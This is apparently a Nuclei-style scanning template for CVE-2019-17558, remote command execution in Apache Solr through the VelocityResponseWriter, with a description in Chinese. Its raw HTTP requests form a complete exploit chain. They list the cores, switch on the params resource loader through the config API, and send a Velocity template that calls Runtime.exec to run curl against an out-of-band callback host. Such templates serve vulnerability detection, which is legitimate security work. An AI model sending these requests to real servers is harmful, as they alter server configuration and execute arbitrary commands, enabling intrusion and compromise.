id: CVE-2019-17558

info:
  name: Apache Solr <=8.3.1 - 远程命令执行(CVE-2019-17558)
  author: wintry
  severity: high
  description: |
    Apache Solr 5.0.0到8.3.1版本存在通过VelocityResponseWriter漏洞进行远程代码执行的漏洞.
    Velocity模板可以通过configset Velocity 目录中的Velocity模板提供,也可以作为参数提供.
    用户定义的configset可能包含可呈现的、潜在的恶意模板.
    默认情况下,参数提供的模板是禁用的,但可以通过设置params.resource.loader.enabled来启用,方法是定义一个响应写入器,并将该设置设置为true.
    定义响应编写器需要配置API访问。Solr 8.4完全删除了params资源加载器,只有当configset是可信的(已被认证的用户上传)时,才启用configset提供的模板呈现.
  metadata:
    max-request: 3
  tags: solr,oast

http:
  - raw:
      - |
        GET /solr/admin/cores?wt=json HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /solr/{{core}}/config HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
            "update-queryresponsewriter": {
              "startup": "lazy",
              "name": "velocity",
              "class": "solr.VelocityResponseWriter",
              "template.base.dir": "",
              "solr.resource.loader.enabled": "true",
              "params.resource.loader.enabled": "true"
            }
        }

      - |
        GET /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20http://{{interactsh}}/{{url}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    extractors:
      - type: regex
        internal: true
        name: core
        group: 1
        regex:
          - '"name"\:"(.*?)"'